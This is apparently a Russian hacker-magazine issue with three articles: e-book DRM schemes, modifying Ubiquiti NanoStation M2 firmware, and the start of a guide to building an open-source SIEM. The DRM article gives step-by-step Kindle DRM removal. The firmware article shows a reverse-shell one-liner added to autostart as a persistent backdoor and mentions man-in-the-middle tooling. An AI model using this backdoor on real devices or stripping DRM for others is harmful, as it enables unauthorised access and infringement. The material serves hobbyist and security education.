лить, после чего секретный ключ пользователя можно было восстановить
и получить неограничен ный доступ ко всем купленным книгам.
  Надежность и этой модели DRM неидеальна. Насколько нам известно,
в Adobe eBook Reader не было сделано никаких значительных тех нических
улучшений для снижения уязвимости DRM.





                       Как работает защита EBX


УЯЗВИМОСТЬ DRM В ФОРМАТЕ PDF
Вообще, обеспечить безопасность книг в формате PDF оказалось достаточ‐
но сложно. В классической реализации DRM от Adobe приложение делало
запрос на сервер, который проверял легальность запроса, а в ответ получало
готовый ключ для расшифровки документа. Нет рудно догадаться, что вся схе‐
ма легко могла быть взломана простым перехватом ключа.
  В Acrobat Reader 6 была применена новая схема, которая давала модулям
защиты  возможность  решать,  каким способом  будет зашифрован  тот
или иной фрагмент PDF‐документа. Перехват ключа работать перестал, так
как между узлами защиты ключ уже не передается. Однако здесь есть другая
проблема. Начиная с шестой версии стандартной читалкой электронных книг
выступает Adobe Acrobat Reader (а не защищенный Adobe eBook Reader).





  Acrobat Reader 6.0

При этом в Acrobat Reader есть поддержка модулей расширения. И если соз‐
дать свой модуль расширения и сделать  так, чтобы он был загружен
в момент, когда открывается защищенная книга, то из этого модуля (который
работает в контексте основного процесса Acrobat Reader) можно получить
полный доступ к содержимому книги.
  А даль ше начинается игра в кошки‐мышки. В Adobe приложили усилия
для того, чтобы посторонние модули не работали, когда пользователь читает
защищен ные книги. С другой стороны, сама возможность запуска модулей
с поддельной цифровой подписью — хоть и в «несертифицированном»
режиме — в приложении сохраняется. Дальнейшие шаги взломщика после
запуска такого модуля — «убедить» Acrobat Reader в том, что несертифици‐
рованный модуль на самом деле вполне сертифицирован.
  Впрочем, развитие DRM на этом не остановилось: есть формат Adobe
Digital Editions Adept DRM, который поддерживается большинством элек трон‐
ных читалок за исклю чением Kindle (и требует регистрации устройства), есть
Adobe Digital Editions with eReader DRM, которая была разработана для фор‐
мата eReader ebook (изначально для Fictionwise, сегодня — часть Barnes &
Noble) и позднее перенесена в Adobe Digital Editions при сотрудничестве B&N
и Adobe. Кстати, B&N до сих пор продает книги с защитой eReader DRM.


DRM ПО-АМАЗОНСКИ
Amazon, пожалуй, самый крупный на сегодняшний день магазин, торгующий
электронными книгами (и не только). У компании есть собственная экосис‐
тема для доступа к контенту: это и читалки Kindle на элек тронных чернилах
(одни из лучших по соот ношению цена — качество), и планшеты Fire, и при‐
ложение Kindle, доступное для всех акту альных плат форм — от десктопной
Windows до iOS и Android.
  При этом у читалок от Amazon есть важное огра ничение: они принципиаль‐
но не понимают открытые форматы электронных книг, такие как ePub или FB2.
Только MOBI и AZW, с DRM‐защитой или без нее.





                         Amazon Kindle

Механизм покупки и пот ребления контента полностью отлажен. Достаточно
выбрать нужную книгу и нажать на кнопку «Купить», как книга тут же появится
в облаке и станет доступна на всех устройствах пользователя и членов его
семьи. Имен но для этого, а не для чего‐то другого в линейке читалок Kindle
появился сначала Wi‐Fi, а потом и бесплат ный доступ в интернет через
сотовую связь.
  До недавнего времени реализацией DRM Amazon особо не заморачивал‐
ся: был (старый) формат MOBI, потом появился более интересный AZW.
   Книги в фор мате Kindle поддерживают DRM; привязка идет к учетной
записи пользователя на Amazon. В приложениях Kindle для iOS книги шиф‐
руются исключительно криптографическим ключом, который генерируется
на основе дан ных учетной записи пользователя. Ставка здесь делается на то,
что извлечь информацию из iPhone или iPad достаточ но сложно.
   Если же говорить о собственных читалках Amazon на E Ink линейки Kindle,
то привязка идет как к серийному номеру устройства, так и к уникальному
идентификатору PID, который присваивается при регистрации. Соответс‐
твенно, ключ для расшифровки скачан ных на такие устройства книг можно
вычислить на основе серийного номера Kindle и его PID. Последний можно
извлечь с помощью инструмента DeDRM Tools (ссылка — ниже), выполнив
следующий скрипт и передав в качестве парамет ра серийный номер устрой‐
ства (само устройство Kindle должно быть в этот момент подключено к компь‐
ютеру):


$ kindlepid.py <Kindle Serial Number>

Приложение для Windows также использует шифрование на осно ве обще го
для учетной записи ключа. Однако извлечь книги из компьютера с Windows
гораздо проще, чем из iPad, поэтому Amazon использует второй слой шиф‐
рования, на сей раз с отдельным сессионным ключом, уникальным для каж‐
дой книги. С точки зрения криптографии реализация вполне на уровне, и рас‐
шифровать книги, не зная ключа, невозможно. Но именно как система DRM
решение не выдерживает никакой критики: оба клю ча все так же хранятся
на компьютере, и их извлечение — дело техники. Собственно, это и было
проделано разработчиками: скрипты для Python доступны и работоспособны
(по крайней мере для старых форматов MOBI и AZW).
  Обойти защиту DRM для форматов Kindle не составляет осо бого труда.
Ниже — пошаговая инструкция (оригинал).
 1. Устанавливаем на компьютер приложение Kindle Reader для Windows.
 2. Скачиваем DeDRM Tools с GitHub.
 3. Устанавливаем Calibre.
 4. Устанавливаем   в   Calibre   плагин   DeDRM_plugin.zip   из   папки
   DeDRM_calibre_plugin.
 5. Теперь можно скачать книги при помощи приложения Kindle.
 6. Далее просто: достаточно перетащить в Calibre книги в форматах AZW‐
   3 или MOBI из папки Документы\\My Kindle Content. DRM будет удален
   автоматически.
 7. Книги теперь можно сконвертировать в FB2, ePub или любой другой фор‐
   мат из поддерживаемых в Calibre.

При желании можно обойтись и без Calibre, воспользовавшись утилитой
командной строки, или попросту обратиться к услугам одного из многочис‐
ленных онлайновых сервисов. Как видишь, все просто.
  Похоже, сложившаяся ситуация в чем‐то перестала устраивать Amazon,
и в 2015 году компания разработа ла новый формат элек тронных книг. Фор‐
мат получил название KFX. Он использует новую систему DRM‐защиты, обой‐
ти которую разработчикам пока не удалось.
   Если приведен ные выше шаги не работают, дело может быть именно
в новом формате книг, а точнее — в версии приложения Kindle, которое
получило возможность их открывать. Начиная с версии 1.19 приложение
Kindle скачивает книги в новом формате KFX, который пока не поддерживает‐
ся инструментом по снятию DRM. Поможет откат до версии Kindle 1.17. Воз‐
можно, после переустановки приложения тебе потребуется удалить все
ранее скачанные книги, выйти из учетной записи, войти в нее снова и заново
скачать издания, защиту с которых ты хочешь снять.
  Впрочем, спустя время оказалось, что страхи Amazon понести потери
от нелегального копирования книг сильно преувеличен ны, и формат KFX так
и не получил широкого распростра нения. В нем доступны некото рые новые
книги, где используют ся дополнительные возможности форматирования,
предоставляемые новым форматом. Однако огромную библиотеку из уже
имеющихся изда ний Amazon в новый формат переводить не стал.


        WWW

                     Найти надежные источники информации о защите
                         книг в форматах для Kindle не очень прос то,
                       поэтому при ведем самые интересные ссылки:
                    •Описание взлома, скрипты для извлечения клю‐
                         чей и расшифровки книг (для старых версий)
                  •О DRM в целом и о деталях раз личных реали‐
                        заций в частности
                     •Скрипты для снятия DRM с различных фор‐
                        матов электронных книг
                   •Общая информа ция по защите и ее снятию,
                       пошаговые инструкции



BARNES & NOBLE: ADOBE DIGITAL EDITIONS PROTECTION (ADEPT)
Вторая по величине сеть книжных магазинов в США использует формат ePub,
защищен ный относительно свежей схемой Adobe Digital Editions (ADEPT).
Подробно на этой схеме мы останавливаться не будем, любопытству ющих
отправим на сайт i‐u2665‐cabbages, где приводит ся подробный анализ схе‐
мы и выложены скрипты, позволяющие извлечь соот ветствующие ключи
и расшифровать электронные книги.
  ADEPT исполь зует просто замечательную криптографическую систему —
которая тем не менее не смогла стать надежной схемой DRM. Каждая книга
шифруется уникальным ключом AES, а сам ключ, в свою очередь, зашиф‐
рован ключом RSA, который генерирует ся на основе учетных данных поль‐
зователя (а точнее, его email). И даже ключ RSA, который сох раня ется
на компьютере пользователя, дополнительно зашифрован с помощью оче‐
редного ключа приложения. Лобовая ата ка на все эти ключи совершенно бес‐
полезна, но зачем она нужна, если ключ все рав но будет храниться на компь‐
ютере? Хакерам потребовалось отыскать сессионный ключ, с помощью
которого защищал ся ключ RSA, которым был зашифрован ключ AES, которым
зашифрованы книги. Звучит сложно, но, если верить хакеру, взло мавшему эту
защиту, на практике развертывание всей цепоч ки было делом ско рее нудным,
чем сложным.





             Barnes & Noble Nook Simple Touch eBook Reader


DRM НЕ НУЖЕН
К счастью, далеко не все книгоиздатели увлекают ся защитой DRM. Так,
немецкие издатели еще в 2015 году пришли к выводу, что наличие DRM толь‐
ко мешает продажам, и отказались от него в пользу так называемого соци‐
аль ного DRM. К такому же выводу пришли и многие независимые издатель‐
ства — например, британский издатель PACKT Publishing, в котором мы опуб‐
ликовали нашу собственную книгу.
  В результате сложилась интересная ситуация: отказаться от про даж через
Amazon издатели не могут, так как именно через этот канал продается боль‐
ше всего экземпля ров. При этом купить ту же самую книгу непосредственно
на сайте издателя (или в одном из сторонних книжных магазинов) можно
по той же цене — но без DRM! Именно так: я был приятно удивлен тем, что
нашу книгу можно купить с сайта PACKT Publishing и мгновенно получить
ссылки на скачивание книги во всех возможных форматах — от ePub и PDF
(разумеется, без DRM) до предназначенного для Kindle файла .mobi.
   Как же издатели контролируют пиратство? А никак. От «жесткого» DRM
издатели переходят к политике, основанной на джентльменском соглашении
(политика «честного слова»), или используют так называемый социальный
DRM. На последнем пункте остановимся под робнее.
  В «социальном DRM» от выкладывания купленных книг в публичный доступ
пользователей  оста навливают цифровые водяные знаки — невидимые
для пользовате ля, но поз воляющие издателю надежно отсле дить про ‐
исхождение «всплывшего» документа. Такие водяные знаки можно встра‐
ивать и в ePub, и в PDF, и в некоторые другие форматы. Фак тически только
наличие водяных знаков и опасение того, что «прикроют аккаунт», и служат
сдерживающим фактором. И как ни странно, это работает.


А ЧТО У НАС?
В нашей стране исторически сложилось так, что для электронных книг наибо ‐
лее популярен формат FB2,  Fiction Book  2. Фор мат открытый, основан
на XML, позволя ет встра ивать двоичные объ екты. Защитить книги в этом фор‐
мате достаточно сложно.
  Другой элемент головолом ки — отсутствие сложившейся инфраструктуры
торговли электронными книгами и полное отсутствие чего‐либо, напоми‐
нающего экосис тему уровня Amazon, Kobo или Barnes & Noble. Иначе говоря,
магазины («Литрес», «Призрачные миры», «Цел люлоза» и множество других
независимых магазинов электронных книг) вынуждены идти одним из двух
путей:  или  предлагать  книги  для  свободного  скачивания  в  удобном
для покупателя формате, или же продавать доступ к сайту, с которого можно
читать оплачен ную (но не купленную) книгу в режиме онлайн.
   Второй вариант — откровенное жлобство, и нам он неинтересен по той
причине, что создает максималь ные неудобства покупателю, заплатившему
собственные деньги за товар. А вот с пер вым способом снова есть варианты.
Так, «Литрес» продает книги без видимых поль зователю модификаций, а при
покупке книги на «Призрачных мирах» во время чтения придется постоянно
стал кивать ся с такими вот предупреждениями:


КНИГА КУПЛЕНА В ИНТЕРНЕТ‐МАГАЗИНЕ WWW.FEISOVET.RU
ПОКУПАТЕЛЬ: Oleg Afonin (aoleg@voicecallcentral.com)  ЗАКАЗ: #287253
385 / 09‐мар‐2017
КОПИРОВАНИЕ И РАСПРОСТРАНЕНИЕ ТЕКСТА ДАННОЙ КНИГИ В ЛЮБЫХ ЦЕЛЯХ
ЗАПРЕЩЕНО!

Честно? Раздражает. Но это не все! Кроме Грозного Предупреждения,
магазин расставляет в тексте еще и такие мар керы:


#287253385 / 09‐мар‐2017

Думаешь, этим идеи разработчиков такой реализации «социального DRM»
ограничились? Как бы не так! Фантазия бор цов за чистоту авторского права
неистощима, и по тексту разбрасывается то, что сами разработ чики, веро ‐
ятно, считают водяными знаками: случайные последовательности букв, поз‐
воляющие  идентифицировать  украденную  книгу.  Например,  читатель
в середине предложения может нат кнуться на словечко вроде «виздр»
или «инаок». Что это, опечатка? Нет, элемент защиты «социального DRM».
  Самое печальное, что смот реть на это приходится в первую очередь тому
читателю, который честно оплатил покупку. И знаешь что? Бесит. Пожалуй,
самая неудачная реализация социального DRM, которую я когда‐либо встре‐
чал. Больше раздра жают  только  графические водяные знаки, которые
выводятся в некоторых защищенных PDF в виде полупрозрачных изоб‐
ражений прямо поверх текста.


ЗАКЛЮЧЕНИЕ
Мы совершили обзорную экскурсию по миру DRM в элек тронных книгах.
В одной статье невозможно рассмотреть все форматы — а их явно больше
того, о чем мы успели поговорить. Собственная система защиты есть у вто ‐
рого по величине американского магазина Barnes & Noble, особняком стоит
Apple с собственной разработ кой iBooks, есть Google Books, есть магазин
Kobo, который может похвастаться тем, что его платформа сертифицирована
государственными библиотеками многих англоязычных стран (можно прийти
со своей читалкой и получить доступ к любой книге из цифрового фон да биб‐
лиотеки — но только на то время, пока читатель физически находится в ней).
Все это тоже интересно, но с точки зрения технической реализации мало
отличается от уже рассмотренных вариантов.
  Вывод же можно сделать такой. Методы защиты DRM для элек тронных
книг существуют, и они в целом работа ют для подавляющего большинства
обычных пользователей (что, собственно, и составляет их основную цель).
Но при желании защиту можно обойти, и это даже не слишком сложно.
При этом единствен ный, кто преследует хакеров с помощью DMCA, —
это компания Adobe, известный сутяжник. Все остальные компании (в первую
очередь Amazon) подобными вещами не занимаются.
  В то же самое время заметен и противоположный тренд: полный отказ
от шифрования и жесткого контроля DRM и переход либо на «джентльмен ‐
ское соглашение», либо на так называемый социальный DRM, при котором
в контент встраиваются более или менее замет ные водяные знаки, иден‐
тифицирующие личность покупателя.
ВЗЛОМ
 ПРОШИТЬ
ПРОШИВКУ





                                      Александр Москвитин
                                                    fobosx@mail.ru





    ПРЕВРАЩАЕМ ТОЧКУ ДОСТУПА
       UBIQUITI NANOSTATION M2
     В ХАКЕРСКИЙ ИНСТРУМЕНТ





NanoStation M2 фирмы Ubiquiti — это всепогодная точка дос‐
тупа, предназначенная для постро ения беспровод ных мос‐
тов на расстояние десять и более километров. Может
работать в режиме радиомоста, точки доступа, репитера.
В качестве процессора в ней используется чип Atheros
AR2315 (MIPS 4KC, 180 МГц). Имеет на борту 32 Мбайт опе‐
ративной памяти и 8 Мбайт флеш. То есть это, по сути,
мини‐компьютер, построенный на архитектуре MIPS, с уста‐
новленным Linux на борту. А это значит, что можно модифи‐
цировать его под свои нужды. Каким образом? Об этом
и поговорим.


ЗАЧЕМ ОНО НАДО?
Кто‐то может с самого начала небезосновательно задать вопрос: а зачем,
собственно, ковырять прошивку? Ведь можно взять готовый SDK и собрать
свою прошивку с практически любым набором программ. Отвечу. Во‐первых,
ребята из Ubiquiti свернули программу по распространению SDK, во‐вторых,
при сборке SDK может возникнуть куча проб лем (у меня, например, так и не
получилось собрать работоспособную версию кастомной про шивки). Ну
и в‐третьих, как ни парадоксально, модификация готовой прошивки требует
минимум инструментов и времени.
   Для  чего  вообще  это  все может  понадобиться? Для  добавления
функциональности, не предусмотренной базовой прошивкой. Например,
для создания обратных тоннелей. Добавив в автозагрузку вот это:


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh ‐i 2>&1 | telnet
remoteip remoteport > /tmp/f

где remoteip — адрес, куда необходимо под ключиться, remoteport — уда‐
ленный порт, можно получить доступ  к устройству даже после сброса
или смены логина/пароля. Для добавления всяких сканеров (я успешно
добавил knocker, это, конечно, не Nmap, но все же), спу феров (собрав тот же
arpspoof, можно реализовать ата ку man in the middle, тем более что tcpdump
уже имеется в базовой прошивке) и прочих прелестей (например, соб рав
OpenVPN, можно получить доступ к сети, где стоит наша железка, из любого
места). В общем, при желании и наличии фантазии можно сделать из Nano‐
Station M2 отличный инструмент для взлома.


ИНСТРУМЕНТЫ
Я проводил все эксперименты на прошивке версии 5.5.4, 6‐я версия имеет
незначительные отличия, но аналогичным образом можно изменить и ее. Все
действия совершались в виртуальной машине, на которой был установлен
Arch Linux. Прежде всего для работы нам понадобится binwalk. В Arch’e ста‐
вим так: pacman ‐S binwalk. Также необходим кросс‐компилятор для архи‐
тектуры MIPS. Тот, который использовал я, можешь взять отсюда. Его нужно
распаковать в удобный каталог. У меня он лежит в /root/toolchains/cross‐
compiler‐mips. Ну и собственно сам файл прошивки  XM‐v5.5.4.build‐
16501.bin. Еще потребуются  утилиты для работы со  squashfs, а  так же
какой‐нибудь hex‐редактор. Я использовал hexedit, установить его просто:
pacman ‐S squashfs‐tools hexedit. Да, для вычисления контрольных сумм
я поставил пакет perl‐archive‐zip: pacman ‐S perl‐archive‐zip, в нем есть
скрипт crc32, он и будет нам нужен. Итак, начнем.


ОБЩЕЕ СТРОЕНИЕ ПРОШИВКИ
Перед тем как что‐то менять, ознакомимся с внут ренним устройством про‐
шивки. В общем случае она представляет собой бинарный файл, который
состоит из следующих частей:
 1. Ubiquiti ﬁrmware header — заголовок прошивки. Содержит строку с вер‐
   сией прошивки.
 2. Ubiquiti partition header — заголовок первого раздела (PARTu‐boot). Здесь
   содержится основная информация о разделе u‐boot: размер, адреса
   памяти для загрузки, максимальный размер и так далее. Стоит отметить,
   что формат заголовков разделов один и тот же, меняются только значения
   параметров для соот ветствующих разделов (имена, размеры, адреса
   памяти).
 3. Загрузчик u‐boot — собственно сам загрузчик.
 4. Ubiquiti partition header — заголовок второго раздела (PARTkernel). Опи‐
   сывает раздел PARTkernel (см. п. 2).
 5. Образ ядра, сжатый алгоритмом LZMA. В основном используется ядро
   версии 2.6.х.
 6. Ubiquiti partition header — заголовок третьего раздела (PARTrootfs). Опи‐
   сание раздела с файловой системой.
 7. Образ файловой системы squashfs, сжа тый алгоритмом LZMA. С этим
   образом мы и будем работать.
 8. Данные, сжатые gzip. Они нам не понадобятся, поэтому опустим под‐
   робности, что они собой представляют.

Базовая информа ция о строении прошивки была получена отсюда.


ПОЕХАЛИ
Для дальнейшего анализа прошивки исполь зовался binwalk. Он под держи‐
вает различные виды анализа, в том числе идентификацию исполняемого
кода, энтропический анализ и построение графиков. Подробнее можно про‐
читать на официальном сайте или на просторах интернета. Итак, переходим
в каталог, куда положили прошивку, cd /root/ubnt, и запускаем binwalk:


binwalk XM‐v5.5.4.build16501.bin





                      Показания binwalk

Тут надо отметить, что binwalk немного неправильно показывает смещения
заголовков разделов (Ubiquiti partition header). К этим смещениям необ‐
ходимо добавить 8 байт (4 байта crc32 предыдущей части и 4 байта допол‐
нение 0х00000000). То есть смещение пер вого  partition header’a будет
не 260, а 268, соответственно третий partition header расположен по сме‐
щению 1232900. Выяснил я это следующим обра зом. Копирую partition head‐
er в отдельный файл:


dd if=XM‐v5.5.4.build16501.bin of=1.bin bs=1 count=56 skip=260

Этой командой создаем файл 1.bin из файла XM‐v5.5.4.build16501.bin
размером 56 байт (count=56), пропуская 260 байт от начала исходного фай‐
ла (skip=260), ключ bs=1 ука зывает dd, что использовать нужно размерность
в 1 байт. Далее смотрим на получившийся файл 1.bin hexdump’ом:


hexdump ‐C 1.bin





           Просматриваем файл 1.bin с помощью hexdump’а

Мы видим, что название секции, в данном случае PARTu‐boot, идет не с
начала файла, а со смещением 8 байт. Получив таким же образом третью
секцию partition header:


dd if=XM‐v5.5.4.build16501.bin of=1.bin bs=1 count=56 skip=1232892
hexdump ‐C 1.bin

также можно убедиться, что название начина ется со смещением 8 байт.
Далее, чтобы удостовериться, что первые 4 байта в файле 1.bin являются
crc32 предыдущей секции, я делал так: копировал секцию Ubiquiti ﬁrmware
header:


dd if=XM‐v5.5.4.build16501.bin of=2.bin bs=1 count=260

и считал ее crc:


crc32 2.bin

Соответственно, вторые 4 байта — это дополнение (0х00000000). Итак, выяс‐
нив правильные смещения partition header’ов, можно прикинуть примерную
структуру прошивки:





                  Примерная структура прошивки

Следует обратить внимание на секцию Ubiquiti partition header (любую — фор‐
мат у них один). А именно на последние 8 байт секции. Для примера возьмем
третий partition header:


dd if=XM‐v5.5.4.build16501.bin of=1.bin bs=1 count=56 skip=1232900 &&
 hexdump ‐C 1.bin

Первые 4 байта из них — размер секции squashfs + deadcode, вторые, судя
по всему, максимальный размер этих секций. Чтобы правильно собрать
новую прошивку, нам нужен будет новый размер модифицированной фай‐
ловой системы, а также понадобится посчитать пару контрольных сумм.


МОДИФИКАЦИЯ ПРОШИВКИ
Алгоритм модификации прошивки в общем виде будет таким: для начала нам
необходимо извлечь образ файловой системы из прошивки, затем ее рас‐
паковать; также нам нужен будет третий заголовок partition header; далее
добавляем в распакованную файловую систему то, что мы хотим; создаем
образ уже модифицированной ФС, прописываем в третий partition header
новый размер, пересчитываем контрольные суммы и склеиваем все в новую
прошивку. А теперь подробнее:
 1. Извлечем данные, которые останут ся неизменными. В нашем слу чае
   это дан ные со смещения 0 по смещение 1232900: dd if=XM-v5.5.4.
   build16501.bin of=header bs=1 count=1232900 .
 2. Извлекаем третий partition header: dd if=XM-v5.5.4.build16501.bin
   of=partition_header bs=1 skip=1232900 count=56 .
 3. А вот дошла очередь и до squashfs: dd if=XM-v5.5.4.build16501.bin
   of=fs.img bs=1 count=5391801 skip=1232956.
 4. Получаем deadcode: dd if=XM-v5.5.4.build16501.bin  of=dead‐
   code bs=1 count=$((6869052-6624757)) skip=6624757.
 5. Извлекаем остальные данные: dd  if=XM-v5.5.4.build16501.bin
   of=gzipdata bs=1 skip=6869060 count=$((6896729-6869060)).
 6. Распаковываем файловую систему: unsquashfs fs.img. После выпол‐
   нения этой коман ды должен появить ся каталог squashfs-root.
 7. Пришло время модифицировать распакованную ФС. Для примера я наб‐
   росал и скомпилировал небольшую Hello World программку:


   #include <stdio.h>
   int main (int argc, char** argv) {
       printf("Hello world!!!n");
       return 0;
   }
   /root/toolchains/cross‐compiler‐mips/bin/mips‐gcc /root/test.c ‐o
   /root/hello ‐static

  Можно собрать и что‐нибудь посерьезнее, например сетевой сканер
   knocker.
 8. Копируем получившийся файл в каталог с распакованной файловой сис‐
   темой: cp /root/hello /root/ubnt/squashfs‐root/bin.
 9. Создаем  образ  нашей,  теперь  уже  измененной  ФС:  mksquashfs
   squashfs‐root/ myfs ‐comp lzma ‐noappend ‐no‐recovery ‐nopad.
   Подробнее о клю чах: ‐comp lzma — ука зыва ем, что необходимо исполь‐
   зовать сжатие LZMA; ‐‐noappend — если выходной файл существует,
   перезаписать его; ‐‐no‐recovery — не создавать файл восстановления;
   ‐‐nopad — не выравнивать по границе 4 Кбайт.
10. Изменим теперь размер секции в partition header. В моем слу чае новый
   размер секции = размер myfs + размер deadcode = 5455727 + 244295 =
   5700022 = 0x56f9b6. hexedit partition_header.





                Смотрим новый размер секции в hexedit
11. Склеиваем вместе partition_header, myfs и deadcode: cat partition_‐
   header myfs deadcode > finalpart. Вычисляем crc32 сек ции: crc32
   finalpart, в моем случае crc=0xe5b9e8b7. Записываем в конец с допол‐
   няющими нулями: echo ‐n ‐e "xe5xb9xe8xb7x00x00x00x00" >> final‐
   part.
12. Теперь склеиваем header ﬁnalpart gzipdata: cat header finalpart gzip‐
   data > final. Считаем crc32: crc32 final, crc=0xb35805c2, записы ‐
   ваем  хвостовую  часть  в  итоговую прошивку: echo  ‐n  ‐e  "END.
   xb3x58x05xc2x00x00x00x00" >> final.

В итоге в файле final оказывается наша модифицированная прошивка.
Осталось только залить ее на устройство (лично я заливал через web‐
интерфейс), затем зайти на него по SSH и запустить нашу программу,
которая просто выведет в консоль Hello world. Кстати, если кому надо, то
модифицированную прошив ку можно взять тут.


ВЫВОДЫ
Как видишь, модифицировать прошивки не так уж и сложно. А порой и нам‐
ного быстрей, чем собирать с нуля из SDK. Чтобы извлечь из модификации
устройства еще больше пользы, можно попытаться собрать под него такие
тулзы, как Nmap и OpenSSH. Правда, у меня пока с этим ничего не вышло,
постоянно  возникали  какие‐то  ошибки  на  этапе  кросс‐компиляции.
Но думаю, это все можно побороть и собрать свой OpenSSH с блек‐джеком
и шлюхами, для орга низации обратных SSH‐туннелей. На этом все. Удачи!
ВЗЛОМ
 АНАЛИЗИРУЙ
       ЭТО

              СТРОИМ SIEM НА ОСНОВЕ
            OPEN SOURCE КОМПОНЕНТОВ
                  ДЛЯ АНАЛИЗА ЛОГОВ





                                      Даниил Светлов
                                                 svetlov@gmail.com





Даже в мелких конторах может сто ять целый зоопарк тех‐
ники, в логах которой черт ногу сломит, а что уж говорить
о больших! В этой статье я покажу, как с помощью бесплат‐
ного и открытого софта  структуриро вать журналы раз ‐
розненных сис тем безопасности. Это поможет легче выяв‐
лять уязвимос ти и заметно упростит жизнь сисадминам.


У СЕМИ НЯНЕК ДИТЯ БЕЗ ГЛАЗА
Когда компания начинает всерьез заниматься информационной безопас‐
ностью, ей приходится внедрять огромное количество разнородных систем.
Антивирус, межсетевой экран, сетевая система обнаружения вторжений
(NIDS), хостовая система обнаружения втор жений (HIDS), Web Application
Firewall (WAF), сканер уязвимостей, система контроля целостности — и это
далеко не самый полный список того, что может использоваться в организа‐
ции. Поскольку безопасность — это не только состояние системы (в клас‐
сическом определении), но и процессы, неотъемлемой частью которых явля‐
ется мониторинг событий ИБ, рано или поз дно появится необходимость цен‐
трализованного наблюдения и анализа логов, которые в огромном количес‐
тве могут генерироваться перечисленными системами.
  И если ты захочешь проанализировать эти логи все вместе, то столкнешь‐
ся с несколькими проблемами. Первая проблема заключается в том, что
практически у всех источников логов свой собственный формат. При этом
некоторые системы могут писать логи в нескольких разных форматах, отли‐
чающихся уровнем информативности.
  Пожалуй, для меня примером наиболее продуманной подсистемы жур‐
налирования служит межсетевой экран Cisco ASA. С одной стороны, его
логи — обычный текст, который легко может передаваться по протоко лу sys‐
log. C другой — каждая строка содержит уникальный идентификатор типа
события. По этому идентифика тору легко можно найти подробное описание
события в документации, включая то, какие элементы в сообщении могут
меняться и какие значения они могут принимать. В данном примере пред‐
ставлены события с идентификаторами 302016 (Teardown UDP connection),
308001 (Console enable password incorrect), 111009 (User 'enable_15'
executed cmd).


%ASA‐6‐302016: Teardown UDP connection 806353 for outside:172.18.123.
243/24057 to identity:172.18.124.136/161 duration 0:02:01 bytes 313
%ASA‐6‐308001: console enable password incorrect for number tries (
from 10.1.1.15)
%ASA‐7‐111009: User 'enable_15' executed cmd: show logging mess 106

Системы обнаружения вторжений с открытым исходным кодом — прак тичес‐
ки полная противоположность. Snort NIDS имеет четыре различных формата
логов. Один из них, uniﬁed 2, — бинарный. Для его обработ ки требуется сто‐
ронняя утилита barnyard2. Зато этот формат, в отличие от осталь ных, может
содержать расшифрованные заголов ки протоколов прикладного уровня. Три
других формата текстовые, два многострочные и один однострочный. Уро‐
вень информативности текстовых форматов по понятным причинам различа‐
ется — от только описания сигнатуры и адресов сокетов до расшифровки
заголовков протоколов транспортного уровня. Для примера — формат aler‐
t_full выглядит следующим образом:


[**] [129:15:1] Reset outside window [**]
[Classification: Potentially Bad Traffic] [Priority: 2]
03/11‐13:34:05.716632 74.125.232.231:443 ‐> 98.14.15.16:2079
TCP TTL:60 TOS:0x0 ID:25102 IpLen:20 DgmLen:40
*****R** Seq: 0xFF405C9D  Ack: 0x0  Win: 0x0  TcpLen: 20

А формат alert_fast:


[119:31:1] (http_inspect) UNKNOWN METHOD [Classification: Unknown
Traffic] [Priority: 3] {TCP} 79.164.145.163:57678 ‐> 52.73.58.27:80

OSSEC HIDS имеет меньшее количество форматов логов, все го два —
однострочный и многострочный. Зато несколько способов передачи: запись
в файл, отправку по протоколу syslog, отправку на ZeroMQ‐сервер. Сам фор‐
мат и содержание лога в большой степени зависит от того, как настро ен OS‐
SEC и какие в нем модули. Заголовок у всех сообщений OSSEC одинаковый,
но если используется модуль контроля целостности syscheck, то после
заголовка, в зависимости от настроек модуля, будут присутствовать кон ‐
трольные суммы измененного файла и diﬀ его изменений. Но если этот же
alert отправляется по протоколу syslog, то diﬀ’а он содержать не будет. Если
сообщение сформировано модулем анализа логов log analysis, то будет при‐
ведено оригинальное сообщение системного журнала, которое вызвало сра‐
батывание. И таких вариаций довольно много.


** Alert 1490901103.1401: ‐ pam,syslog,authentication_success,
2017 Mar 30 23:11:43 hw1‐>/var/log/secure
Rule: 5501 (level 3) ‐> 'Login session opened.'
Mar 30 23:11:42 hw1 sshd[1427]: pam_unix(sshd:session): session
opened for user root by (uid=0)
** Alert 1490901561.1803: mail ‐ ossec,syscheck,
2017 Mar 30 23:19:21 hw1‐>syscheck
Rule: 550 (level 7) ‐> 'Integrity checksum changed.'
Integrity checksum changed for: '/etc/resolv.conf'
Size changed from '87' to '97'
Old md5sum was: 'd3465a94521bbadf60e36cdf04f04bea'
New md5sum is : '524d80c6cc4c76bd74a173ef4f40096a'
Old sha1sum was: 'b6e622f922f75200a32c3426f09ab92b8ab82b12'
New sha1sum is : '6a3e34e2f77af6687dc1583bee9118b620aa7af8'

При таком разнообразии форматов и способов хра нения анализ логов всех
этих систем может стать довольно трудоемким процессом. Конечно же,
для упрощения подобных задач уже существует специальный класс ПО —
SIEM. И если хороших систем обнаружения втор жений с открытым исходным
кодом хватает, то вот SIEM с открытым исходным кодом практически нет.
Существует довольно много решений для конкрет ной IDS. Например, Snorby
для Snort или Analogi для OSSEC. Но воз можности добавить в эти системы
какие‐то дополнительные источники событий не предусмотрено. Есть сис‐
темы, которые обладают и более широкими возможностями, но, ско рее,
представляют собой бесплат ные версии коммерческих решений с целым
набором искусственных ограничений. Я встречал даже такую систему,
в которой разработчики намеренно переписали запросы к БД, чтобы сделать
их более медленными. Но даже эти системы имели не самый дружественный
пользователю интерфейс. Вот и получа ется, что у семи нянек дитя без глаза.


КОМАНДА ГЕРОЕВ, КОТОРУЮ ЖДАЛИ
Таким образом, у сообщества есть пот ребность в SIEM из компонентов
с открытым исходным кодом, чтобы в ней не было искусственных ограничений
и чтобы она обла дала такими качествами, как высокая скорость, безопас‐
ность и дружествен ность по отношению к пользователю. Ведь количество
угроз информационной безопасности растет с каждым днем. И если ты
работаешь в компании из 50 человек, все эти угрозы ее также затрагивают,
а бюджет на ИБ, скорее всего, чуть меньше нуля. Ты вполне можешь бесплат‐
но развернуть свободные IDS, а нормаль ной возможности анализировать их
журналы у тебя не будет. После долгих поисков и даже попыток написать
SIEM на PHP я нашел решение, которое позволяет вообще не писать прог‐
раммный код и при этом получать неплохие результаты при поиске в логах
и сигналах тревоги. Решение состоит в использовании высокоинтегрирован‐
ного стека приложений ELK — Elasticsearch, Logstash и Kibana. Неплохим
дополнением ко всему этому станут плагины Search Guard или  Shield.
Для объединения всех составных частей:  пакетов, конфигов, плагинов
и дополнительных скриптов — я написал Ansible playbook и выложил на GitHub
